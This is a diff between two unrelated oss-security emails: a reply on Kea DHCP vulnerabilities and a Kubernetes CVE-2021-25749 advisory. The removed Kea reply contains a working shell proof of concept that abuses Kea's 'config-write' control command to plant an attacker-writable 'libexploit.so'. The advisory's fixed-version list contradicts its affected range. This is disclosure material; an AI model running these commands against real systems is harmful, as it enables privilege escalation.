@@ -1,4 +1,4 @@
-Received: (qmail 13544 invoked by uid 550); 28 May 2025 18:23:39 -0000
+Received: (qmail 7228 invoked by uid 550); 15 Sep 2022 22:02:10 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,57 +7,93 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 13517 invoked from network); 28 May 2025 18:23:39 -0000
-Authentication-Results:garm.ovh; auth=pass (GARM-109S0032f7444f4-db54-4448-bb23-04aff08398be,
-                    99B821EB379423EA779491C0A280EB282E82DE62) smtp.auth=jwilk@jwilk.net
-X-OVh-ClientIp:31.0.176.17
-Date: Wed, 28 May 2025 20:23:25 +0200
-From: Jakub Wilk <jwilk@jwilk.net>
-To: oss-security@lists.openwall.com
-Message-ID: <20250528182325.yuupynsufybqvea3@jwilk.net>
-Mail-Followup-To: oss-security@lists.openwall.com
-References: <2f8f64a2-118d-458e-9f1a-182d4d88ad17@isc.org>
- <aDdGEfMxLaRJzSK9@kasco.suse.de>
+Received: (qmail 1095 invoked from network); 15 Sep 2022 21:49:59 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20210112;
+        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
+         :date;
+        bh=qKwdOHCrshvw6xe+mpSAANsytKwdSb4zefX6SBMXBys=;
+        b=PgVt2lyJszUu4OyPqminIyoHt9yunzeUMzXQ/34AWEHM1MiOgI/kyAQJbzISF7kS7M
+         3bZmPJUAJ9bxCMCntGAJePaRp5KX5kwfueqoskxnwQ5w7pmj4+KHc/BWa9yBjmNZj3XQ
+         Tp8jtctaNhII4SLhh3U2N6Md6+LzoDy5IG8DGc4P/vFWGBhcjMZ6QEqbe96dNP/VLbOo
+         PksltmPO4XAJXP0pbaK2qcCjGAflLjFNUPNIP/wPvKd3vhIgXZexnBtrzlp6+RC10u8E
+         JuwwSf6VtH11/4HssEg1TAO/5nj0pgylT0LGdNJr+x3kZg98Ee2eU3zejAlztf65x6mk
+         gnqg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20210112;
+        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
+         :from:to:cc:subject:date;
+        bh=qKwdOHCrshvw6xe+mpSAANsytKwdSb4zefX6SBMXBys=;
+        b=X7Vvs9wUec+X0Mw0K9Bfq9gV9r0ls3QyYCwML9l2C9FnbRdUBnOUO4VIbiEfZ+Faap
+         YRaZn9ODtQLZmqElntgVIR67j5gT3Alc9a3OfdwFeErN949AQ8kirhx6lH/nWkZLWDE5
+         Ho5PvSs9L4m85otpC3T26Y7JFnNf6ELxeRpy2x3k6sUC9sKL8cDZ2uNWjWKnf0vMybP3
+         qaF+KNyYDt3x17uIabfYL1RdfQGZ4MoZtci4R2rnpndx1HI+6PJ6XESd2x8gnzbEtjKR
+         gZ2gGxsIafeuetvMdkIDv5NqCnQZQEG66nj5L7DzJQYFK6kgYobnNMd16sqlEKYRNdKJ
+         eEsQ==
+X-Gm-Message-State: ACrzQf330DiUcSrgYk5AC8xTekgKrpcwkmX8YNbSHrsq/S9C9EhtGCsM
+	hOngLIGb8MjObcEwRu4+0yi18/paDhX9AAXEmK0HCtQXSjE=
+X-Google-Smtp-Source: AMsMyM7crFXwIynk/AlE5zxSIZDWL2b0rT8aIW5ZbAahMq+qqUGX54YBi25ibO5gbmFGK+/I3Suc1vbeyaj0bs7iJd4=
+X-Received: by 2002:a05:6214:27ed:b0:4ac:7fd7:7d8b with SMTP id
+ jt13-20020a05621427ed00b004ac7fd77d8bmr1422223qvb.129.1663278587417; Thu, 15
+ Sep 2022 14:49:47 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii; format=flowed
-Content-Disposition: inline
-In-Reply-To: <aDdGEfMxLaRJzSK9@kasco.suse.de>
-X-Ovh-Tracer-Id: 6098155372169276625
-X-VR-SPAMSTATE: OK
-X-VR-SPAMSCORE: 0
-X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrgeeffedrtddtgddvfeeljeculddtuddrgeefvddrtddtmdcutefuodetggdotefrodftvfcurfhrohhfihhlvgemucfqggfjpdevjffgvefmvefgnecuuegrihhlohhuthemucehtddtnecunecujfgurhepfffhvffukfhfgggtuggjsehttdertddttddvnecuhfhrohhmpeflrghkuhgsucghihhlkhcuoehjfihilhhksehjfihilhhkrdhnvghtqeenucggtffrrghtthgvrhhnpeelfeevfeduheeihfeuledvveeiteevgfekieefveekleffgfeiieefkeevieejkeenucfkphepuddvjedrtddrtddruddpfedurddtrddujeeirddujeenucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepihhnvghtpeduvdejrddtrddtrddupdhmrghilhhfrhhomhepjhifihhlkhesjhifihhlkhdrnhgvthdpnhgspghrtghpthhtohepuddprhgtphhtthhopehoshhsqdhsvggtuhhrihhthieslhhishhtshdrohhpvghnfigrlhhlrdgtohhmpdfovfetjfhoshhtpehmohehfeegmgdpmhhouggvpehsmhhtphhouhht
-DKIM-Signature: a=rsa-sha256; bh=8oXtjaw6WvJE7kZs0iUJug55H/jVFGC4CKVzjvnOvQY=;
- c=relaxed/relaxed; d=jwilk.net; h=From; s=ovhmo917968-selector1;
- t=1748456610; v=1;
- b=e4548VLw4tiE92YOwhXxCdJ2biQrTD2IOemmT3OlQ3oTBFO9Qwa0R+1nQ5vquzQuz3hYQ3ix
- YofpEWAGR4f+Xs9za70GeLUhs9SLonuadvIS+uXP23iUXlcbuJQoLQLmT5tO7nUGRYdgk7pIwCj
- FnlWB+KPkFSmY27j8Xr73DdnMLtjsmkIiLx2iew0hNHfilfut/Br6uCT/u2uXLVfuVtBpfFNoZH
- 7ZnJMKyTSYdNyLDePmrdAs0nXlSVrz9hXvA7wAD9NWEFDr+vSq5DjGwJHtGIDMjHQHf+8C6E/GY
- XnTxUmjCistkIe7kg/+pPdrSepnGpNTs1Kad8d4wvsoPw==
-Subject: Re: [oss-security] ISC has disclosed three vulnerabilities in Kea
- (CVE-2025-32801, CVE-2025-32802, CVE-2025-32803)
+From: Pushkar Joglekar <pushkarj.at.work@gmail.com>
+Date: Thu, 15 Sep 2022 14:49:36 -0700
+Message-ID: <CAGsPOT3VSqGbvGySuZsJ4mkqBb5PApH66VyNrxTPFT2sCPo09Q@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary="0000000000005d9a2105e8be39bf"
+Subject: [oss-security] [kubernetes] CVE-2021-25749: runAsNonRoot logic bypass for Windows containers
 
-* Matthias Gerstner <mgerstner@suse.de>, 2025-05-28 19:21:
->By leveraging issue 3.2), the Kea services can be instructed to create 
->`_kea` owned files in the attacker's `$HOME/.Private`. The content of 
->the created files is not fully attacker controlled, however, so it will 
->not be possible to craft a valid ELF object for loading via `dlopen()` 
->this way. By placing a setgid-directory in `$HOME/.Private/evil-dir`, 
->any files created in this directory will even have the group-ownership 
->of the attacker. The file mode will be 0644, however,
+--0000000000005d9a2105e8be39bf
+Content-Type: text/plain; charset="UTF-8"
 
-Default ACLs to the rescue!
+Hello Kubernetes Community,
 
-$ chmod a+x ~
-$ mkdir -m 777 ~/.Private
-$ setfacl -d -m u:$LOGNAME:rwx ~/.Private/
-$ curl -s -H "Content-Type: application/json" -d '{ "command": "config-write", "arguments": { "filename": "'"$HOME"'/.Private/libexploit.so" } }' localhost:8000 > /dev/null
-$ echo pwned > ~/.Private/libexploit.so
-$ ls -l ~/.Private/libexploit.so
--rw-rw-rw-+ 1 _kea _kea 6 May 28 18:15 /home/jwilk/.Private/libexploit.so
-$ cat ~/.Private/libexploit.so
-pwned
+A security issue was discovered in Kubernetes that could allow Windows
+workloads to run as ContainerAdministrator even when those workloads set
+the runAsNonRoot option to true .
 
--- 
-Jakub Wilk
+This issue has been rated low and assigned CVE-2021-25749
+<https://hackmd.io/ndl5QD3tTUKqYdO7rfGX7A#Am-I-vulnerable>Am I vulnerable?
+
+All Kubernetes clusters with following versions, running Windows workloads
+with runAsNonRoot are impacted.
+Affected Versions
+
+   - kubelet v1.20 - v1.21
+   - kubelet v1.22.0 - v1.22.13
+   - kubelet v1.23.0 - v1.23.10
+   - kubelet v1.24.0 - v1.24.4
+
+How do I mitigate this vulnerability?
+
+There are no known mitigations to this vulnerability.
+<https://hackmd.io/ndl5QD3tTUKqYdO7rfGX7A#Fixed-Versions>Fixed Versions
+
+   - kubelet v1.22.14
+   - kubelet v1.23.11
+   - kubelet v1.23.5
+   - kubelet v1.25.0
+
+To upgrade, refer to this documentation. *For core Kubernetes:*
+https://kubernetes.io/docs/tasks/administer-cluster/cluster-management/#upgrading-a-cluster
+Detection
+
+Kubernetes Audit logs may indicate if the user name was misspelled to
+bypass the restriction placed on which user is a pod allowed to run as.
+
+If you find evidence that this vulnerability has been exploited, please
+contact security@kubernetes.io
+Additional Details
+
+See the GitHub issue for more details:
+https://github.com/kubernetes/kubernetes/issues/112192
+Acknowledgements
+
+This vulnerability was reported and fixed by Mark Rosetti (@marosset)
+
+Thank You,
+
+Pushkar Joglekar on behalf of the Kubernetes Security Response Committee
+
+--0000000000005d9a2105e8be39bf--
